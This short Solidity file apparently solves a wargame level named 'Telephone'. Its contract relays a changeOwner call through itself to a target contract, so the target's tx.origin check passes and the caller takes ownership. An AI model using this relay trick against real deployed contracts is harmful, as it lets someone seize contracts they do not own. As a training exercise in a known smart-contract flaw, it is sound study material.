// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner (address address_owner) external;
}


contract Telephone {
    function changeOwner(address _contractAddress) public {
        ITelephone(_contractAddress).changeOwner(msg.sender);
    }
}